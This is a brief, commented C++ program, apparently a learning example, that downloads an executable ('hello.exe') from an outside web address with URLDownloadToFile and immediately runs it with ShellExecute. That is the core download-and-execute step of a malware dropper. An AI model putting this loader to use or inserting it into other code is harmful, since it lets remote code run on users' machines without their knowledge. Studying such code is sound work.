#include <windows.h>
#include <urlmon.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")

int main()
{
    HRESULT hr = URLDownloadToFile(
        NULL,
        "https://auto-download-one.vercel.app/hello.exe", // URL of file
        "hello.exe",                                      // local file name
        0,
        NULL);

    // HRESULT URLDownloadToFile(
    //              LPUNKNOWN            pCaller,    Used if you want COM object identity (rare in normal code).
    //              LPCTSTR              szURL,      The URL of the file you want to download.
    //              LPCTSTR              szFileName, The full local path where you want the file saved. Must include both the path and filename.
    //   _Reserved_ DWORD                dwReserved,  Reserved. Always 0.
    //              LPBINDSTATUSCALLBACK lpfnCB       Optional callback function to track download progress. NULL if you don’t care about progress.
    // );

    if (SUCCEEDED(hr))
    { // The SUCCEEDED macro in C++ is used to determine whether a given HRESULT value represents a successful operation. It evaluates to true if the HRESULT value is greater than or equal to zero, indicating success.
        std::cout << "[+] File downloaded successfully as hello.exe" << std::endl;
    }
    else
    {
        std::cerr << "[-] Download failed. HRESULT: " << std::hex << hr << std::endl;
    }

    ShellExecute(NULL, "open", "hello.exe", NULL, NULL, SW_SHOWNORMAL);

    //     HINSTANCE ShellExecuteA(
    //     HWND   hwnd,         // handle to parent window (can be NULL)
    //     LPCSTR lpOperation,  // action to perform: "open", "edit", "print", etc.
    //     LPCSTR lpFile,       // file name or program to execute
    //     LPCSTR lpParameters, // arguments if lpFile is an executable
    //     LPCSTR lpDirectory,  // default working directory (NULL = current)
    //     INT    nShowCmd      // how the window is shown (SW_SHOWNORMAL, hidden, etc.)
    // );

    return 0;
}
